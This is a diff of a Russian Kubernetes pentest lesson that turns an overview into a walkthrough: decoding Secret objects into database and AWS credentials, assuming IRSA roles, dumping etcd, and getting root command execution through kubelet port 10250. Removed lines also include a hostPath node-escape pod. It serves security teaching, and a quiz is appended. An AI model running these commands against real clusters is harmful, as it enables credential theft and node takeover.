@@ -14,191 +14,140 @@ useful_for:
 estimated_minutes: 35
 summary: "Где хранятся секреты в Kubernetes, как читать их через API, kubelet и etcd, и как захватывать service-account токены. Практические команды и типовые мисконфиги."
 ---
-## Зачем этот урок
 
-Секреты Kubernetes (пароли, токены, ключи) — главная цель в кластере. Они лежат в etcd, монтируются в поды и выдаются сервис-аккаунтам. Понимание того, где живут секреты и как до них добраться, превращает доступ к одному поду в компрометацию всего кластера.
+## Задача
 
-## Где живут секреты
+В прошлом уроке мы научились повышать права через RBAC. Но зачем вообще становиться админом кластера? Затем, что кластер — это **хранилище секретов**: пароли баз, токены CI, ключи, а главное — облачные креды, которыми пользуются приложения. Цель урока: из одного пода добраться до этих секретов и понять, где они физически лежат.
 
-- **etcd** — основной store, хранит всё (в т.ч. Secret-объекты).
-- **ServiceAccount-токены** — JWT, монтируются в `/var/run/secrets/kubernetes.io/serviceaccount/token`.
-- **kubelet** — на каждой ноде, отдаёт API `/pods`, `/exec`, `/logs`.
-- **Secret-объекты** — доступны через API, если есть RBAC-права.
-- **Переменные окружения** подов — часто содержат те же секреты.
-- **Облачные секреты** — Secrets Manager/Key Vault через CSI-драйверы.
+## Данные, с которыми работаем
 
-## Чтение секретов через API
+Наш объект — снова под `web-7f9c-abc` с shell'ом внутри. У нас есть SA-токен по стандартному пути. В отличие от прошлого урока, у этого токена уже есть право `get secrets` — проверим и сразу им воспользуемся.
 
 ```bash
-kubectl get secrets -A
-kubectl get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d
-kubectl describe secret db-creds -n prod
-# изнутри пода
-cat /var/run/secrets/kubernetes.io/serviceaccount/token
-kubectl --token=$TOKEN get secrets -A
+$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+$ kubectl --token="$TOKEN" auth can-i get secrets -n prod
+yes
 ```
 
-Права проверяются через `kubectl auth can-i get secrets --as=system:serviceaccount:ns:sa`.
+## Шаг 1: читаем Secret-объекты
 
-## kubelet: часто забытый вход
+**Secret** — объект Kubernetes для хранения чувствительных данных. Важно понимать сразу: по умолчанию Secret **не зашифрован**, а лишь закодирован в base64. Base64 — это обратимое кодирование, не шифрование; любой, кто читает Secret, читает и данные.
 
-kubelet слушает 10250 (и 10255 без аутентификации в старых версиях). С токеном SA можно:
+Смотрим, что есть в namespace `prod`:
 
 ```bash
-curl -k https://NODE:10250/pods -H "Authorization: Bearer $TOKEN"
-curl -k https://NODE:10250/run/<ns>/<pod>/<container> -d "cmd=id" \
-  -H "Authorization: Bearer $TOKEN"
+$ kubectl --token="$TOKEN" get secrets -n prod
+NAME         TYPE     DATA   AGE
+db-creds     Opaque   2      14d
+aws-creds    Opaque   3      3d
 ```
 
-Анонимный доступ (`--anonymous-auth=true`) или `AlwaysAllow`-авторизация открывают RCE на ноде.
-
-## etcd: сердце кластера
-
-etcd на 2379/2380. Если доступен без клиентских сертификатов:
+Читаем `db-creds`. Значение лежит в поле `.data`, закодированное base64, поэтому декодируем:
 
 ```bash
-etcdctl --endpoints=https://127.0.0.1:2379 \
-  --cert=/etc/kubernetes/pki/etcd/server.crt \
-  --key=/etc/kubernetes/pki/etcd/server.key \
-  --cacert=/etc/kubernetes/pki/etcd/ca.crt get / --prefix --keys-only
-etcdctl get /registry/secrets/default/db-creds
+$ kubectl --token="$TOKEN" get secret db-creds -n prod -o jsonpath='{.data.password}' | base64 -d
+Prod_DB_S3cret!
 ```
 
-В etcd лежат ВСЕ секреты кластера, включая токены и сертификаты.
-
-## Разобранный пример: от пода к секретам кластера
-
-1. Внутри пода читаем SA-токен.
-2. `kubectl auth can-i --list --token=$TOKEN` — что разрешено.
-3. Если `get secrets` — выгружаем все секреты.
-4. Если `create pods` — монтируем hostPath `/` и получаем ноду.
-5. С ноды читаем kubelet-конфиги и `/etc/kubernetes/pki`.
-6. Получаем доступ к etcd и админ-сертификаты.
-
-## Кража SA-токенов
-
-Токены SA по умолчанию монтируются в поды (до K8s 1.24 автоматом, позже — через projected volume). Их можно украсть через SSRF приложения, `exec` в под, или чтение env. Долгоживущие токены (legacy) особенно опасны. `automountServiceAccountToken: false` снижает риск.
-
-## Защита
-
-- Включить шифрование etcd at-rest (`EncryptionConfiguration`).
-- RBAC least privilege, запрет `get secrets` для неадминов.
-- Отключить анонимный доступ к kubelet, включить `Webhook`-авторизацию.
-- `automountServiceAccountToken: false` где не нужно.
-- OIDC/Workload Identity вместо долгоживущих токенов.
-- Аудит-логи API-сервера.
-
-## Частые ошибки
-
-- Считать, что Secret — «защищённый»: по умолчанию он лишь base64.
-- Игнорировать kubelet как вектор.
-- Не проверять, зашифрован ли etcd.
-- Забывать, что любой, кто читает Secret, читает и данные, и часто — облачные креды.
-- Путать RBAC-права пода и пользователя.
-
-## Что дальше / решение
-
-От SA-токена двигайтесь к: (1) секретам кластера, (2) побегу на ноду (privileged/hostPath), (3) облачным креды через IRSA. Для защиты — шифрование, строгий RBAC и отключение анонимного kubelet.
-
-## IRSA и Workload Identity
-
-В EKS поды получают AWS-креды через IRSA: SA связан с IAM-ролью через OIDC. Токен SA (projected, с audience `sts.amazonaws.com`) обменивается на временные AWS-креды. Если украсть такой токен, можно встать на роль:
+Пароль базы — в руках. А теперь `aws-creds`:
 
 ```bash
-# изнутри пода с IRSA
-TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
-aws sts assume-role-with-web-identity \
-  --role-arn arn:aws:iam::111122223333:role/EksPodRole \
-  --role-session-name pod --web-identity-token $TOKEN
+$ kubectl --token="$TOKEN" get secret aws-creds -n prod -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key)=\(.value|@base64d)"'
+AWS_ACCESS_KEY_ID=AKIA...
+AWS_SECRET_ACCESS_KEY=wJalr...
+AWS_DEFAULT_REGION=eu-west-1
 ```
 
-В GKE аналог — Workload Identity (`iam.gke.io/gcp-service-account`), в AKS — workload identity federation.
-
-## Секреты: env vs volume
-
-- **env** — видны в `/proc/<pid>/environ`, `docker inspect`, логах приложения.
-- **volume** — файлы в tmpfs, меньше утечек в логи, но всё равно читаемы процессом.
-- **CSI Secret Store** — секреты из облачного хранилища монтируются как файлы и часто кэшируются.
-
-При компрометации пода читайте и env, и смонтированные файлы, и облачные секреты через CSI.
-
-## Инструменты аудита
+`jq` здесь проходит по всем парам и декодирует каждую (`@base64d`). Из одного K8s-секрета мы получили **облачные креды**. Проверяем, что они открывают:
 
 ```bash
-kube-bench run --targets=master,node        # CIS-бенчмарк
-kube-hunter --remote <cluster>               # внешняя проверка
-kubectl auth can-i --list --as=system:serviceaccount:ns:sa
-kubectl get rolebindings,clusterrolebindings -A -o wide
-peirates                                       # интерактивный эксплойт-фреймворк
+$ aws sts get-caller-identity
+{
+    "Account": "111122223333",
+    "Arn": "arn:aws:iam::111122223333:role/prod-app"
+}
 ```
 
-`kube-bench` флаги: `--targets`, `--benchmark`, `--json`. `kube-hunter` флаги: `--remote`, `--cidr`, `--active`.
+Это уже не «кластер» — это AWS-аккаунт прода.
 
-## Разобранный пример: Secret → облачные креды
+## Шаг 2: откуда креды в поде — IRSA и Workload Identity
 
-1. Из пода читаем SA-токен и проверяем права.
-2. `kubectl get secrets -A -o yaml` — находим `aws-creds` (если есть права).
-3. Внутри — `AWS_ACCESS_KEY_ID`/`SECRET`, ведущие в аккаунт.
-4. `aws sts get-caller-identity` → определяем роль.
-5. `enumerate-iam` → ищем эскалацию.
-Так K8s-секрет превращается в облачный доступ.
+Секрет в `Secret` — статичный, «долгоживущий». Но современные кластеры выдают подам облачные креды **динамически** через механизм доверия: сервисный аккаунт Kubernetes связан с облачной ролью, и токен SA обменивается на временные креды. В AWS это **IRSA** (IAM Roles for Service Accounts).
 
-## Разобранный пример: побег к ноде
-
-Если есть `create pods` в namespace с ослабленным PSA:
+Механика: под получает projected-токен с особым «audience» (`sts.amazonaws.com`), который можно предъявить AWS STS:
 
 ```bash
-kubectl run pwn --image=alpine --restart=Never \
-  --overrides='{"spec":{"containers":[{"name":"pwn","image":"alpine",
-  "command":["/bin/sh","-c","sleep 100000"],
-  "volumeMounts":[{"name":"h","mountPath":"/host"}]}],
-  "volumes":[{"name":"h","hostPath":{"path":"/"}}]}}'
-kubectl exec -it pwn -- chroot /host /bin/sh
+$ TOKEN=$(cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token)
+$ aws sts assume-role-with-web-identity \
+    --role-arn arn:aws:iam::111122223333:role/EksPodRole \
+    --role-session-name pod \
+    --web-identity-token "$TOKEN"
+{
+  "Credentials": { "AccessKeyId": "ASIA...", "Expiration": "2026-10-12T13:00:00Z" }
+}
 ```
 
-С ноды — доступ к kubelet, `/etc/kubernetes/pki`, облачным метаданным.
+В GKE аналог — **Workload Identity** (`iam.gke.io/gcp-service-account`), в AKS — workload identity federation. Для атакующего разница одна: если токен украден (например, через SSRF приложения), можно встать на роль, **не имея доступа к секретам кластера**.
 
-## Чек-лист защиты
+## Шаг 3: где секреты лежат на самом деле — etcd
 
-- [ ] etcd зашифрован at-rest.
-- [ ] RBAC: минимум `get secrets`, нет wildcard.
-- [ ] kubelet: `anonymous-auth=false`, webhook-авторизация.
-- [ ] `automountServiceAccountToken: false` где возможно.
-- [ ] PSA restricted для пользовательских namespace.
-- [ ] Аудит-логи включены и хранятся неизменно.
-
-## Аудит RBAC на wildcard
-
-Опасные конфигурации: `ClusterRole` с `resources: ["*"]`, `verbs: ["*"]` или `secrets` с `get/list`. Проверка:
+Все Secret-объекты хранятся в **etcd** — распределённой базе, которая держит всё состояние кластера. API-сервер читает и пишет туда, а etcd слушает порты `2379`/`2380`. Если etcd доступен без клиентских сертификатов (а иногда он открыт), вы читаете **всё** напрямую, минуя RBAC:
 
 ```bash
-kubectl get clusterroles -o json | jq '.items[] | select(.rules[].resources[]?=="secrets") | .metadata.name'
-kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name=="cluster-admin") | .subjects'
-kubectl auth can-i get secrets --as=system:serviceaccount:default:default
+$ etcdctl --endpoints=https://127.0.0.1:2379 \
+    --cert=/etc/kubernetes/pki/etcd/server.crt \
+    --key=/etc/kubernetes/pki/etcd/server.key \
+    --cacert=/etc/kubernetes/pki/etcd/ca.crt get /registry/secrets/prod/aws-creds
+/registry/secrets/prod/aws-creds
+k8s:enc:aescbc:v1:key1:...
 ```
 
-Сервис-аккаунт `default` часто имеет право читать собственный токен, но не секреты. Ищите SA, привязанные к `cluster-admin` или к ролям с `secrets`.
+Обрати внимание: если включено **шифрование at-rest**, значение будет нечитаемым (`k8s:enc:...`), и на диске секрет лежит зашифрованным. Это важная защита — о ней ниже. Без шифрования здесь видны все секреты кластера разом.
 
-## Секреты в GitOps
+## Если не сработало: kubelet как вход
 
-ArgoCD/Flux хранят манифесты в Git. Если Secret закоммичен (даже base64) — он утёк. Sealed Secrets и SOPS шифруют, но ключ расшифровки может лежать в кластере. Проверяйте: (1) историю Git на секреты, (2) права на SealedSecrets-ключ, (3) доступ к репозиторию. `git log -p | grep -i secret` и trufflehog/gitleaks по репозиторию быстро выявляют утечки.
+**kubelet** — агент на каждой ноде, который запускает поды. Он слушает порт `10250` и умеет `exec` в контейнеры. Если авторизация настроена слабо (`--anonymous-auth=true` или режим `AlwaysAllow`), это RCE на ноде:
 
-## Сводная таблица векторов
+```bash
+$ curl -sk https://10.10.20.15:10250/pods -H "Authorization: Bearer $TOKEN" | jq -r '.items[].metadata.name'
+web-7f9c-abc
+ci-runner-xyz
+$ curl -sk https://10.10.20.15:10250/run/prod/web-7f9c-abc/web -d 'cmd=id' \
+    -H "Authorization: Bearer $TOKEN"
+uid=0(root) gid=0(root)
+```
 
-| Вектор | Что даёт | Митигация |
-|--------|----------|-----------|
-| SA-токен в поде | права SA, часто облачные креды | automount off, RBAC least-priv |
-| get secrets | все секреты namespace | запрет get/list secrets |
-| kubelet 10250 без auth | RCE на ноде | anonymous-auth off, webhook |
-| etcd без TLS | все секреты кластера | клиентские сертификаты, шифрование |
-| privileged/hostPath | побег к ноде | PSA restricted, admission |
-| CI/CD → cluster | деплой вредоносного пода | ограничить SA пайплайна |
+kubelet часто «забытый вход»: RBAC на API-сервере закрыт, а нодовый порт открыт.
 
-## Секреты в переменных и файлах
+## Частые ошибки и подводные камни
 
-Секреты монтируются либо как env (видны в `/proc/<pid>/environ`), либо как файлы в tmpfs. При компрометации пода проверьте оба места и облачные секреты через CSI. Для защиты — предпочитайте файлы (меньше утечек в логи) и `automountServiceAccountToken: false`.
+- **Считать Secret «защищённым» объектом.** По умолчанию он лишь base64-кодирован; шифрование at-rest — отдельная настройка, которую часто забывают включить.
+- **Игнорировать kubelet как вектор.** Даже если RBAC API-сервера закрыт, порт `10250` на ноде может оставаться открытым и давать `exec` в поды.
+- **Не проверять `automountServiceAccountToken`.** Токен монтируется в под автоматически, если это не отключено явно, — и его видит любой, кто получил код в контейнере.
+- **Путать права пода и пользователя.** Роль, которой вы работаете через `kubectl`, и роль пода — разные; проверяйте обе отдельно.
+- **Забывать про долгоживущие токены.** Legacy SA-токены не истекают и хранятся как Secret — идеальный материал для персистентности.
+- **Считать, что чтение секрета видно только в аудите API.** Облачные креды из секрета дают доступ в аккаунт, где следы придётся искать уже в CloudTrail.
+
+- **Путать чтение секрета с чтением его значения.** `kubectl get secret` без `-o jsonpath` показывает лишь base64-обёртку; декодировать нужно отдельно.
+
+## Что мы теперь знаем
+
+- Secret по умолчанию — лишь base64, не шифрование.
+- Из `get secrets` достаются и облачные креды — прямой мост в аккаунт.
+- IRSA/Workload Identity выдают креды по токену SA — их можно использовать напрямую.
+- Все секреты кластера хранятся в **etcd** (2379); шифрование at-rest делает их нечитаемыми.
+- **kubelet** (10250) — отдельный, часто открытый вход с RCE на ноду.
+- Секреты живут и в env (`/proc/<pid>/environ`), и в смонтированных файлах.
+
+## На что смотреть дальше
+
+- **Admission-контроллеры** (OPA/Kyverno) — как они могут запретить чтение секретов.
+- **Pod Security Admission** — уровни `baseline`/`restricted` и их обход.
+- **ArgoCD/Flux**: секреты в GitOps и как они утекают через репозиторий.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Где хранится «истина» о секретах Kubernetes?"
@@ -227,21 +176,25 @@ ArgoCD/Flux хранят манифесты в Git. Если Secret закомм
   explanation: "10250 — основной API kubelet; 10255 — read-only."
 - question: "Почему открытый etcd (2379) критичен?"
   options:
-    - "Он только для метрик"
+    - "Он отдаёт только метрики"
     - "Он отдаёт всё состояние кластера, включая секреты"
-    - "Он для DNS"
+    - "Он отвечает за DNS"
     - "Он шифрует трафик"
   answer: 1
   explanation: "etcd содержит все объекты кластера, включая Secret."
-- question: "Чем legacy SA-токены опаснее projected?"
+- question: "Чем IRSA отличается от статичного Secret с AWS-кредами?"
   options:
-    - "Они короче"
-    - "Они долгоживущие и хранятся как Secret, что удобно для персистентности"
-    - "Они шифруются"
-    - "Они не существуют"
-  answer: 1
-  explanation: "Legacy-токены не истекают автоматически — идеальная персистентность."
+    - "Она выдаёт временные креды по токену SA, а не хранит долгоживущие ключи"
+    - "Она хранит пароли в открытом виде"
+    - "Она работает только в Docker"
+    - "Она не связана с облаком"
+  answer: 0
+  explanation: "IRSA обменивает projected-токен SA на временные AWS-креды через OIDC."
 ```
+
+## Куда дальше
+
+В следующем уроке мы разберём **admission-контроллеры** — OPA и Kyverno — которые пытаются не пустить тебя к этим секретам и привилегированным подам, и посмотрим, где в их правилах остаются дыры. А пока главное запомни: **в Kubernetes секрет — это не «защищённый объект», а обычная запись в etcd**, и путь к ней ведёт через RBAC, kubelet или сам etcd.
 
 ## Где пригодится
 
